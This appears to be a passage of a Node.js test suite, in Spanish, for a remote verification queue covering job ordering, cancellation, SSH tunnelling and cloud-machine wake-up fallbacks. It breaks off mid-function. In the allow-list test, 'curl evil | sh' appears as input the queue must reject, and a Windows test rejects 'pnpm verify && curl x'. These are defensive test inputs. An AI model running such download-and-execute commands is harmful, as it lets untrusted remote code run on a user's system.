/**
 * La cola de `verify --remote` con git, HTTP y bash de verdad; el comando de cada
 * corrida es un `chain.sh` del propio commit, porque lo que se prueba es la cola.
 */
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { once } from "node:events";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import test from "node:test";

import { checkConfig, createHttpServer, createQueue, resolveCommand } from "../../scripts/verify-queue/server.mjs";
import { createWake } from "../../scripts/verify-remote.mjs";

const verify = resolve(import.meta.dirname, "../../scripts/verify.mjs");
const skip = process.platform === "win32" ? "la cola solo corre en Linux" : false;
const PREPARE = 'pnpm() { bash ./chain.sh "$@"; }';
const config = { repos: { terminus: { prepare: PREPARE, commands: ["pnpm verify", "pnpm verify --no-cargo"] } } };

const gitEnv = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t", GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
const git = (cwd, ...args) => execFileSync("git", args, { cwd, env: gitEnv, encoding: "utf8" }).trim();

function workspace(t) {
  const dir = mkdtempSync(join(tmpdir(), "verify-queue-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const repo = join(dir, "repo");
  mkdirSync(repo);
  git(repo, "init", "-q");
  return { dir, repo, home: join(dir, "home") };
}

function commit(repo, chain) {
  writeFileSync(join(repo, "chain.sh"), chain);
  git(repo, "add", ".");
  git(repo, "commit", "-q", "--allow-empty", "-m", "c");
  return git(repo, "rev-parse", "HEAD");
}

function bundle(repo, dir) {
  const file = join(dir, "c.bundle");
  git(repo, "update-ref", "refs/verify-remote/t", "HEAD");
  git(repo, "bundle", "create", "-q", file, "refs/verify-remote/t");
  return file;
}

async function serve(t, queue) {
  const server = createHttpServer(queue);
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  t.after(() => server.close());
  return `127.0.0.1:${server.address().port}`;
}

/** Corre `verify.mjs --remote` como lo haría `pnpm verify --remote`. */
async function client(cwd, host, args = [], env = {}) {
  const child = spawn(process.execPath, [verify, "--remote", ...args], { cwd, env: { ...gitEnv, VERIFY_REMOTE_HOST: host, VERIFY_REMOTE_TERMINUS: "/nonexistent/terminus", VERIFY_REMOTE_AWS: "/nonexistent/aws", VERIFY_REMOTE_INSTANCE: "i-1", ...env } });
  let output = "";
  child.stdout.on("data", (chunk) => { output += chunk; });
  child.stderr.on("data", (chunk) => { output += chunk; });
  const [code] = await once(child, "close");
  return { code, output };
}

test("corre por orden de llegada, una a la vez, con checkout limpio y target fija", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const trace = join(dir, "trace");
  const first = commit(repo, `
    ls -A >> ${trace}; echo "$CARGO_TARGET_DIR" >> ${trace}
    echo "uno-$1" >> ${trace}; sleep 0.3; touch leftover; mkdir -p "$CARGO_TARGET_DIR"; touch "$CARGO_TARGET_DIR/kept"; echo fin-uno; echo "uno-fin" >> ${trace}`);
  const a = await queue.submit({ repo: "terminus", commit: first, command: "pnpm verify", bundle: bundle(repo, dir) });
  const second = commit(repo, `ls -A >> ${trace}; ls "$CARGO_TARGET_DIR" >> ${trace}; echo dos >> ${trace}; echo fallo-real >&2; exit 7`);
  const b = await queue.submit({ repo: "terminus", commit: second, command: "pnpm verify --no-cargo", bundle: bundle(repo, dir) });
  await queue.settled();

  const lines = readFileSync(trace, "utf8").split("\n");
  assert.ok(lines.indexOf("uno-fin") < lines.indexOf("dos"), "la segunda espera a la primera");
  assert.equal(lines.filter((line) => line === "leftover").length, 0, "lo que no es target se limpia");
  assert.ok(lines.includes("kept"), "la target sobrevive entre corridas");
  assert.equal(queue.readRun(a.id).state, "passed");
  assert.equal(queue.readRun(b.id).state, "failed");
  assert.equal(queue.readRun(b.id).exitCode, 7);
  assert.match(readFileSync(queue.logPath(b.id), "utf8"), /fallo-real/);
  assert.equal(existsSync(join(home, "busy")), false);
});

test("solo acepta un repo y un comando de su lista", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const sha = commit(repo, "true");
  await assert.rejects(queue.submit({ repo: "otro", commit: sha, command: "pnpm verify" }), /no corre el repo/);
  await assert.rejects(queue.submit({ repo: "terminus", commit: sha, command: "curl evil | sh" }), /no corre «curl evil/);
  await assert.rejects(queue.submit({ repo: "terminus", commit: "HEAD", command: "pnpm verify" }), /commit inválido/);
  await assert.rejects(queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify", bundle: join(dir, "nada") }), /bundle/);
});

test("con el disco lleno borra la target y recompila una sola vez", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  let percent = 10;
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => percent });
  const count = join(dir, "count");
  const sha = commit(repo, `
    echo x >> ${count}
    if [ -e "$CARGO_TARGET_DIR/stale" ]; then exit 3; fi
    mkdir -p "$CARGO_TARGET_DIR"; touch "$CARGO_TARGET_DIR/stale"; exit 0`);
  await queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify", bundle: bundle(repo, dir) });
  await queue.settled();

  percent = 90;
  const before = await queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify" });
  await queue.settled();
  assert.equal(queue.readRun(before.id).state, "passed", "se borró antes de correr");
  assert.equal(queue.readRun(before.id).targetRebuilt, true);

  const seen = readFileSync(count, "utf8").length;
  const flip = commit(repo, `echo x >> ${count}; exit 4`);
  const failing = await queue.submit({ repo: "terminus", commit: flip, command: "pnpm verify", bundle: bundle(repo, dir) });
  await queue.settled();
  assert.equal(queue.readRun(failing.id).exitCode, 4);
  assert.equal(readFileSync(count, "utf8").length - seen, 2, "ya borró al empezar: el fallo no repite");
});

test("un fallo con el disco lleno a mitad de corrida borra la target y repite una vez", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const full = join(dir, "full");
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => (existsSync(full) ? 90 : 10) });
  const count = join(dir, "count");
  const sha = commit(repo, `
    echo x >> ${count}
    if [ -e ${full} ]; then [ ! -e "$CARGO_TARGET_DIR/stale" ]; exit $?; fi
    mkdir -p "$CARGO_TARGET_DIR"; touch "$CARGO_TARGET_DIR/stale" ${full}; exit 5`);
  const run = await queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify", bundle: bundle(repo, dir) });
  await queue.settled();
  assert.equal(readFileSync(count, "utf8").length, 4, "dos intentos");
  assert.equal(queue.readRun(run.id).targetRebuilt, true);
  assert.equal(queue.readRun(run.id).state, "passed", "el segundo intento ya no ve la target vieja");
});

test("una corrida que la cola no terminó se reporta interrumpida y la cola sigue", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const sha = commit(repo, "echo hola");
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const run = await queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify", bundle: bundle(repo, dir) });
  await queue.settled();
  const meta = join(home, "runs", run.id, "meta.json");
  writeFileSync(meta, JSON.stringify({ ...queue.readRun(run.id), state: "running" }));
  const reborn = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  reborn.recover();
  await reborn.settled();
  assert.equal(reborn.readRun(run.id).state, "interrupted");
});

test("--remote devuelve el exit real y el log entero, y dice qué plataforma no cubre", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const host = await serve(t, queue);
  commit(repo, "echo paso-visible; exit 7");
  const failed = await client(repo, host);
  assert.equal(failed.code, 7, failed.output);
  assert.match(failed.output, /paso-visible/);
  assert.match(failed.output, /falló \(exit 7\)/);
  assert.match(failed.output, /Linux en 127/);
  assert.match(failed.output, /NO se comprobó: una corrida --remote nunca cuenta por ellos/);

  commit(repo, "echo segundo");
  const passed = await client(repo, host, ["--no-cargo"]);
  assert.equal(passed.code, 0, passed.output);
  assert.match(passed.output, /segundo/);
  assert.match(passed.output, /pnpm verify --no-cargo/);
  assert.equal(git(repo, "for-each-ref", "refs/verify-remote/"), "", "la ref temporal no se queda");
  assert.equal(queue.knownCommits("terminus").length, 2);
});

test("los cambios sin commit no se verifican en silencio", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const host = await serve(t, createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
  commit(repo, "true");
  writeFileSync(join(repo, "chain.sh"), "false");
  const { code, output } = await client(repo, host);
  assert.equal(code, 2);
  assert.match(output, /cambios sin commit/);
});

test("--attach retoma una corrida y repite el log; --cancel la corta", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const host = await serve(t, queue);
  commit(repo, "echo largo; sleep 30");
  const child = spawn(process.execPath, [verify, "--remote"], { cwd: repo, env: { ...gitEnv, VERIFY_REMOTE_HOST: host } });
  let first = "";
  child.stdout.on("data", (chunk) => { first += chunk; });
  while (!/Corrida (\S+)/.test(first)) await once(child.stdout, "data");
  const id = /Corrida (\S+)/.exec(first)[1].replace(":", "");
  child.kill("SIGTERM");
  await once(child, "close");
  assert.equal(queue.readRun(id).state === "running" || queue.readRun(id).state === "queued", true, "matar al cliente no mata la corrida");

  const attached = client(repo, host, ["--attach", id]);
  while (queue.readRun(id).state === "queued") await new Promise((done) => setTimeout(done, 50));
  await new Promise((done) => setTimeout(done, 300));
  const cancelled = await client(repo, host, ["--cancel", id]);
  assert.equal(cancelled.code, 0, cancelled.output);
  const { code, output } = await attached;
  assert.equal(code, 1);
  assert.match(output, /largo/);
  assert.match(output, /se canceló/);
  assert.equal(queue.readRun(id).exitCode, null);
});

test("--detach encola y devuelve el id sin esperar", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const host = await serve(t, queue);
  commit(repo, "echo despues");
  const { code, output } = await client(repo, host, ["--detach"]);
  assert.equal(code, 0, output);
  const id = /--attach (\S+?)`/.exec(output)[1];
  await queue.settled();
  assert.equal(queue.readRun(id).state, "passed");
});

test("sin acceso da un error claro que manda a la cadena local", { skip }, async (t) => {
  const { repo } = workspace(t);
  commit(repo, "true");
  const { code, output } = await client(repo, "127.0.0.1:9");
  assert.equal(code, 2);
  assert.match(output, /No hay acceso a la cola/);
  assert.match(output, /`pnpm verify`/);
});

/** Un ssh que solo hace lo que el cliente le pide: reenviar `-L` hacia la cola. */
function fakeSsh(dir, queuePort) {
  const path = join(dir, "ssh");
  writeFileSync(path, `#!/usr/bin/env node
const net = require("node:net");
const [, port] = process.argv[process.argv.indexOf("-L") + 1].split(":");
net.createServer((client) => {
  const queue = net.connect(${queuePort}, "127.0.0.1");
  client.pipe(queue).pipe(client);
  client.on("error", () => {});
  queue.on("error", () => {});
}).listen(Number(port), "127.0.0.1");
`, { mode: 0o755 });
  return path;
}

test("un host sin puerto llega a la cola por túnel SSH", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const host = await serve(t, createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
  commit(repo, "echo por-tunel");
  const { code, output } = await client(repo, "vm-verify", [], { VERIFY_REMOTE_SSH: fakeSsh(dir, host.split(":")[1]) });
  assert.equal(code, 0, output);
  assert.match(output, /por-tunel/);
});

test("sin ssh en el PATH lo dice y no intenta encender", { skip }, async (t) => {
  const { dir, repo } = workspace(t);
  const aws = join(dir, "aws");
  writeFileSync(aws, `#!/bin/sh\ntouch ${join(dir, "called")}\n`, { mode: 0o755 });
  commit(repo, "true");
  const { code, output } = await client(repo, "vm-verify", [], { VERIFY_REMOTE_SSH: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws });
  assert.equal(code, 2);
  assert.match(output, /No encontré ssh en el PATH/);
  assert.match(output, /`pnpm verify`/);
  assert.equal(existsSync(join(dir, "called")), false);
});

test("sin Tailscale lo dice y no intenta encender", { skip }, async (t) => {
  const { dir, repo } = workspace(t);
  const ssh = join(dir, "ssh");
  const aws = join(dir, "aws");
  writeFileSync(ssh, "#!/bin/sh\necho 'ssh: Could not resolve hostname vm-verify: No such host is known.' >&2\nexit 255\n", { mode: 0o755 });
  writeFileSync(aws, `#!/bin/sh\ntouch ${join(dir, "called")}\n`, { mode: 0o755 });
  commit(repo, "true");
  const { code, output } = await client(repo, "vm-verify", [], { VERIFY_REMOTE_SSH: ssh, VERIFY_REMOTE_AWS: aws });
  assert.equal(code, 2);
  assert.match(output, /Tailscale no está conectado aquí, o esta máquina no tiene acceso/);
  assert.equal(existsSync(join(dir, "called")), false);
});

test("el bundle temporal se borra al terminar", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const host = await serve(t, createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
  commit(repo, "true");
  const temporary = join(dir, "tmp");
  mkdirSync(temporary);
  const { code, output } = await client(repo, host, [], { TMPDIR: temporary });
  assert.equal(code, 0, output);
  assert.deepEqual(readdirSync(temporary), []);
});

test("sin permiso de SSH no intenta encender la máquina", { skip }, async (t) => {
  const { dir, repo } = workspace(t);
  const ssh = join(dir, "ssh");
  const aws = join(dir, "aws");
  writeFileSync(ssh, "#!/bin/sh\necho 'verify@vm-verify: Permission denied (tailscale).' >&2\nexit 255\n", { mode: 0o755 });
  writeFileSync(aws, `#!/bin/sh\ntouch ${join(dir, "called")}\n`, { mode: 0o755 });
  commit(repo, "true");
  const { code, output } = await client(repo, "vm-verify", [], { VERIFY_REMOTE_SSH: ssh, VERIFY_REMOTE_AWS: aws });
  assert.equal(code, 2);
  assert.match(output, /No hay acceso a la cola/);
  assert.equal(existsSync(join(dir, "called")), false);
});

test("la máquina apagada se enciende con las credenciales de quien lanza", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const aws = join(dir, "aws");
  const called = join(dir, "called");
  writeFileSync(aws, `#!/bin/sh\necho "$@" > ${called}\n`, { mode: 0o755 });
  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
  const server = createHttpServer(queue);
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const { port } = server.address();
  await new Promise((done) => server.close(done));
  t.after(() => server.close());
  commit(repo, "echo despierta");
  const running = client(repo, `127.0.0.1:${port}`, [], { VERIFY_REMOTE_AWS: aws, VERIFY_REMOTE_INSTANCE: "i-1" });
  while (!existsSync(called)) await new Promise((done) => setTimeout(done, 50));
  server.listen(port, "127.0.0.1");
  const { code, output } = await running;
  assert.equal(code, 0, output);
  assert.match(readFileSync(called, "utf8"), /ec2 start-instances --region us-east-1 --instance-ids i-1/);
  assert.match(output, /despierta/);
});

const started = { version: 1, result: { computer_id: "cmp_1", name: "vm-verify", power: "starting" }, error: null };
const refused = (code) => ({ version: 1, result: null, error: { code } });

/** Ejecutable falso: anota sus argumentos y responde lo siguiente de `answers`, repitiendo el último. */
function fakeCli(dir, name, answers) {
  const path = join(dir, name);
  const calls = join(dir, `${name}.calls`);
  writeFileSync(path, `#!/usr/bin/env node
const { appendFileSync, existsSync, readFileSync } = require("node:fs");
const calls = ${JSON.stringify(calls)};
const answers = ${JSON.stringify(answers)};
const count = existsSync(calls) ? readFileSync(calls, "utf8").split("\\n").length - 1 : 0;
appendFileSync(calls, process.argv.slice(2).join(" ") + "\\n");
const { stdout = "", stderr = "", code = 0 } = answers[Math.min(count, answers.length - 1)];
process.stdout.write(stdout);
process.stderr.write(stderr);
process.exitCode = code;
`, { mode: 0o755 });
  return { path, calls: () => (existsSync(calls) ? readFileSync(calls, "utf8").trim().split("\n") : []) };
}

const envelope = (body, code = body.error ? 1 : 0) => ({ stdout: JSON.stringify(body), code });

function wakeWith(t, answers, host = "vm-verify") {
  const { dir } = workspace(t);
  const terminus = fakeCli(dir, "terminus", answers);
  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
  const wake = createWake(host, { VERIFY_REMOTE_TERMINUS: terminus.path, VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" });
  return { wake, terminus, aws };
}

test("enciende con terminus y no toca aws", { skip }, (t) => {
  const { wake, terminus, aws } = wakeWith(t, [envelope(started)]);
  assert.equal(wake().state, "started");
  assert.deepEqual(terminus.calls(), ["machine start vm-verify --json"]);
  assert.deepEqual(aws.calls(), []);
});

test("con host:puerto enciende la máquina por defecto", { skip }, (t) => {
  const { wake, terminus } = wakeWith(t, [envelope(started)], "127.0.0.1:8787");
  wake();
  assert.deepEqual(terminus.calls(), ["machine start vm-verify --json"]);
});

test("la cola de Windows enciende vm-windows-shared", { skip }, (t) => {
  const { wake, terminus } = wakeWith(t, [envelope(started)], "vm-windows-shared:8787");
  wake();
  assert.deepEqual(terminus.calls(), ["machine start vm-windows-shared --json"]);
});

test("en Windows los comandos de la lista van por cmd.exe, no por bash", () => {
  const profile = { prepare: "pnpm install --frozen-lockfile", commands: ["pnpm verify"] };
  assert.deepEqual(resolveCommand(profile, "pnpm verify", {}, true).argv, ["cmd.exe", "/d", "/s", "/c", "pnpm install --frozen-lockfile && pnpm verify"]);
  assert.deepEqual(resolveCommand(profile, "pnpm verify", {}, false).argv, ["bash", "-lc", "pnpm install --frozen-lockfile && pnpm verify"]);
  assert.equal(resolveCommand(profile, "pnpm verify && curl x", {}, true), null);
});

test("la configuración de Windows pasa checkConfig", () => {
  const windows = JSON.parse(readFileSync(resolve(import.meta.dirname, "../../scripts/verify-queue/windows/repos.json"), "utf8"));
  assert.equal(checkConfig(windows), windows);
  assert.ok(Object.values(windows.repos).every((profile) => profile.user), "en Windows cada perfil tiene usuario de corrida");
});

test("VERIFY_REMOTE_TERMINUS sustituye a danil y a terminus", { skip }, (t) => {
  const { dir } = workspace(t);
  const danil = fakeCli(dir, "danil", [envelope(started)]);
  const cli = fakeCli(dir, "cli", [envelope(started)]);
  const override = fakeCli(dir, "override", [envelope(started)]);
  createWake("vm-verify", { DANIL_CLI: danil.path, TERMINUS_CLI: cli.path, VERIFY_REMOTE_TERMINUS: override.path })();
  assert.deepEqual(override.calls(), ["machine start vm-verify --json"]);
  assert.deepEqual([...danil.calls(), ...cli.calls()], []);
});

/** `danil` y `terminus` falsos; sin respuestas, ese ejecutable no existe. */
function bothClis(t, danilAnswers, terminusAnswers) {
  const { dir } = workspace(t);
  const danil = danilAnswers ? fakeCli(dir, "danil", danilAnswers) : { path: join(dir, "no-danil"), calls: () => [] };
  const terminus = terminusAnswers ? fakeCli(dir, "terminus", terminusAnswers) : { path: join(dir, "no-terminus"), calls: () => [] };
  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
  const wake = createWake("vm-verify", { DANIL_CLI: danil.path, TERMINUS_CLI: terminus.path, VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" });
  return { wake, danil, terminus, aws };
}

test("solo terminus enciende", { skip }, (t) => {
  const { wake, terminus, aws } = bothClis(t, null, [envelope(started)]);
  assert.equal(wake().state, "started");
  assert.deepEqual(terminus.calls(), ["machine start vm-verify --json"]);
  assert.deepEqual(aws.calls(), []);
});

test("solo danil enciende", { skip }, (t) => {
  const { wake, danil, aws } = bothClis(t, [envelope(started)], null);
  assert.equal(wake().state, "started");
  assert.deepEqual(danil.calls(), ["machines machine start vm-verify --json"]);
  assert.deepEqual(aws.calls(), []);
});

test("con danil y terminus gana danil", { skip }, (t) => {
  const { wake, danil, terminus } = bothClis(t, [envelope(started)], [envelope(started)]);
  assert.equal(wake().state, "started");
  assert.equal(danil.calls().length, 1);
  assert.deepEqual(terminus.calls(), []);
});

const danilUnusable = {
  "no conoce el comando": envelope(refused("invalid_request"), 2),
  "no conoce el comando y no responde JSON": { stderr: "error: unrecognized subcommand 'machines'\n", code: 2 },
  "rechaza el contexto TERMINUS_*": envelope({ version: 1, result: null, error: { code: "conflicting_selection", detail: { reason: "legacy_environment", variables: ["TERMINUS_CLI"] } } }, 2),
};
for (const [name, answer] of Object.entries(danilUnusable)) {
  test(`danil que ${name} cae a terminus y no lo repite`, { skip }, (t) => {
    const { wake, danil, terminus, aws } = bothClis(t, [answer], [envelope(started)]);
    assert.equal(wake().state, "started");
    wake();
    assert.equal(danil.calls().length, 1);
    assert.equal(terminus.calls().length, 2);
    assert.deepEqual(aws.calls(), []);
  });
}

test("danil sin sesión va a aws sin pasar por terminus", { skip }, (t) => {
  const { wake, terminus, aws } = bothClis(t, [envelope(refused("machine_account"))], [envelope(started)]);
  assert.equal(wake().state, "started");
  assert.deepEqual(terminus.calls(), []);
  assert.equal(aws.calls().length, 1);
});

test("danil que rechaza por permisos no cae a terminus ni a aws", { skip }, (t) => {
  const { wake, terminus, aws } = bothClis(t, [envelope(refused("access_denied"))], [envelope(started)]);
  assert.equal(wake().state, "failed");
  assert.deepEqual([...terminus.calls(), ...aws.calls()], []);
});

test("sin ningún CLI cae a aws", { skip }, (t) => {
  const { wake, aws } = bothClis(t, null, null);
  assert.equal(wake().state, "started");
  assert.equal(aws.calls().length, 1);
});

test("computer_stopping reintenta sin caer a aws", { skip }, (t) => {
  const { wake, aws } = wakeWith(t, [envelope(refused("computer_stopping"))]);
  assert.equal(wake().state, "retry");
  assert.deepEqual(aws.calls(), []);
});

for (const code of ["machine_account", "machine_unreachable", "identity_unavailable", "invalid_request"]) {
  test(`${code} cae a aws una sola vez`, { skip }, (t) => {
    const { wake, terminus, aws } = wakeWith(t, [envelope(refused(code))]);
    assert.equal(wake().state, "started");
    wake();
    assert.deepEqual(aws.calls(), Array(2).fill("ec2 start-instances --region us-east-1 --instance-ids i-1"));
    assert.equal(terminus.calls().length, 1);
  });
}

test("un CLI sin `machine` cae a aws", { skip }, (t) => {
  const { wake, aws } = wakeWith(t, [{ stderr: "error: unrecognized subcommand 'machine'\n", code: 2 }]);
  assert.equal(wake().state, "started");
  assert.equal(aws.calls().length, 1);
});

test("sin terminus cae a aws", { skip }, (t) => {
  const { dir } = workspace(t);
  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
  assert.equal(createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" })().state, "started");
  assert.equal(aws.calls().length, 1);
});

const clearRefusals = { access_denied: /no puede encenderla/, license_required: /licencia/, not_found: /no la ve/, provider_unavailable: /respondió provider_unavailable/, machine_unknown: /respondió machine_unknown/ };
for (const [code, words] of Object.entries(clearRefusals)) {
  test(`${code} se explica y no cae a aws`, { skip }, (t) => {
    const { wake, aws } = wakeWith(t, [envelope(refused(code))]);
    const { state, message } = wake();
    assert.equal(state, "failed");
    assert.match(message, words);
    assert.deepEqual(aws.calls(), []);
  });
}

test("sin el ID de la instancia no llama a aws y dice qué falta", { skip }, (t) => {
  const { dir } = workspace(t);
  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
  const { state, message } = createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path })();
  assert.equal(state, "failed");
  assert.match(message, /VERIFY_REMOTE_INSTANCE/);
  assert.deepEqual(aws.calls(), []);
});

test("aws reintenta IncorrectInstanceState y falla enseguida con lo demás", { skip }, (t) => {
  const { dir } = workspace(t);
  const aws = fakeCli(dir, "aws", [{ stderr: "An error occurred (IncorrectInstanceState) when calling StartInstances\n", code: 254 }, { stderr: "Unable to locate credentials\n", code: 253 }]);
  const wake = createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" });
  assert.equal(wake().state, "retry");
  const { state, message } = wake();
  assert.equal(state, "failed");
  assert.match(message, /No hay acceso a la cola/);
});

/** La cola apagada en un puerto conocido; `listen` la levanta cuando el encendido llega. */
async function offlineQueue(t, home) {
  const server = createHttpServer(createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const { port } = server.address();
  await new Promise((done) => server.close(done));
  t.after(() => server.close());
  return { port, listen: () => server.listen(port, "127.0.0.1") };
}

test("--remote reintenta cada 15 s mientras la máquina se apaga y sigue al encender", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const terminus = fakeCli(dir, "terminus", [envelope(refused("computer_stopping")), envelope(started)]);
  const queue = await offlineQueue(t, home);
  commit(repo, "echo tras-apagado");
  const startedAt = Date.now();
  const running = client(repo, `127.0.0.1:${queue.port}`, [], { VERIFY_REMOTE_TERMINUS: terminus.path });
  while (terminus.calls().length < 2) await new Promise((done) => setTimeout(done, 50));
  assert.ok(Date.now() - startedAt >= 15_000);
  queue.listen();
  const { code, output } = await running;
  assert.equal(code, 0, output);
  assert.match(output, /tras-apagado/);
});

test("--remote cae a aws sin sesión de Danil y corre igual", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const terminus = fakeCli(dir, "terminus", [envelope(refused("machine_account"))]);
  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
  const queue = await offlineQueue(t, home);
  commit(repo, "echo por-aws");
  const running = client(repo, `127.0.0.1:${queue.port}`, [], { VERIFY_REMOTE_TERMINUS: terminus.path, VERIFY_REMOTE_AWS: aws.path });
  while (!aws.calls().length) await new Promise((done) => setTimeout(done, 50));
  queue.listen();
  const { code, output } = await running;
  assert.equal(code, 0, output);
  assert.match(output, /machine_account/);
  assert.match(output, /por-aws/);
});

test("--remote termina enseguida si la cuenta no puede encender, con el motivo", { skip }, async (t) => {
  const { dir, repo } = workspace(t);
  const terminus = fakeCli(dir, "terminus", [envelope(refused("access_denied"))]);
  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
  commit(repo, "true");
  const { code, output } = await client(repo, "127.0.0.1:9", [], { VERIFY_REMOTE_TERMINUS: terminus.path, VERIFY_REMOTE_AWS: aws.path });
  assert.equal(code, 2);
  assert.match(output, /no puede encenderla/);
  assert.deepEqual(aws.calls(), []);
});

test("un fallo tras aceptar el encendido no corta la espera", { skip }, async (t) => {
  const { dir, repo, home } = workspace(t);
  const terminus = fakeCli(dir, "terminus", [envelope(started), envelope(refused("provider_unavailable"))]);
  const queue = await offlineQueue(t, home);
  commit(repo, "echo aguanta");
  const running = client(repo, `127.0.0.1:${queue.port}`, [], { VERIFY_REMOTE_TERMINUS: terminus.path });
  while (terminus.calls().length < 2) await new Promise((done) => setTimeout(done, 50));
  queue.listen();
  const { code, output } = await running;
  assert.equal(code, 0, output);
  assert.match(output, /aguanta/);
});

test("sin credenciales de AWS el encendido no se reintenta", { skip }, async (t) => {
  const { dir, repo } = workspace(t);
  const aws = join(dir, "aws");
  const calls = join(dir, "calls");
  writeFileSync(aws, `#!/bin/sh\necho x >> ${calls}\necho 'Unable to locate credentials' >&2\nexit 253\n`, { mode: 0o755 });
  commit(repo, "true");
  const { code, output } = await client(repo, "127.0.0.1:9", [], { VERIFY_REMOTE_AWS: aws });
  assert.equal(code, 2);
  assert.match(output, /No hay acceso a la cola/);
  assert.equal(readFileSync(calls, "utf8"), "x\n");
});

test("si la máquina cae al recibir el commit, lo manda otra vez", { skip }, async (t) => {
  const { repo, home } = workspace(t);
  const inner = createHttpServer(createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
  let dropped = false;
  const server = createServer((request, response) => {
    if (request.method === "POST" && request.url.startsWith("/runs?") && !dropped) {
      dropped = true;
      return request.socket.destroy();
    }
    inner.emit("request", request, response);
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  t.after(() => server.close());
  commit(repo, "echo segundo-intento");
  const { code, output } = await client(repo, `127.0.0.1:${server.address().port}`);
  assert.equal(code, 0, output);
  assert.equal(dropped, true);
  assert.match(output, /segundo-intento/);
});

const idleStop = resolve(import.meta.dirname, "../../scripts/verify-queue/verify-idle-stop");
const idleSkip = process.platform === "linux" ? false : "el apagado solo corre en Linux";
const MINUTE = 60;
const HOUR = 60 * MINUTE;

/** Corre el apagado con `loginctl`, `ps` y `shutdown` falsos; dice si pidió apagar. */
function idleCheck(t, { sessions = [], processes = "", idleFor = 20 * MINUTE, files = {}, noStamp = false } = {}) {
  const dir = mkdtempSync(join(tmpdir(), "verify-idle-"));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const bin = join(dir, "bin");
  const home = join(dir, "home");
  const stamp = join(dir, "stamp");
  mkdirSync(bin);
  mkdirSync(home);
  const now = Date.now() / 1000;
  if (!noStamp) {
    writeFileSync(stamp, "");
    utimesSync(stamp, now - idleFor, now - idleFor);
  }
  for (const [name, age] of Object.entries(files)) {
    mkdirSync(dirname(join(home, name)), { recursive: true });
    writeFileSync(join(home, name), "");
    utimesSync(join(home, name), now - age, now - age);
  }
  const listed = sessions.map((_, index) => `  echo "s${index} 1001 verify - - active no -"`).join("\n");
  const details = sessions.map(({ age, state = "active" }, index) => `  s${index}) if [ "$4" = State ]; then echo ${state}; else date -d @${Math.round(now - age)}; fi ;;`).join("\n");
  writeFileSync(join(bin, "loginctl"), `#!/bin/bash
if [ "$1" = list-sessions ]; then
${listed || "  :"}
  exit 0
fi
case "$2" in
${details}
esac
`, { mode: 0o755 });
  writeFileSync(join(bin, "ps"), `#!/bin/sh\ncat <<'END'\n${processes}\nEND\n`, { mode: 0o755 });
  writeFileSync(join(bin, "shutdown"), `#!/bin/sh\ntouch ${join(dir, "stopped")}\n`, { mode: 0o755 });
  try {
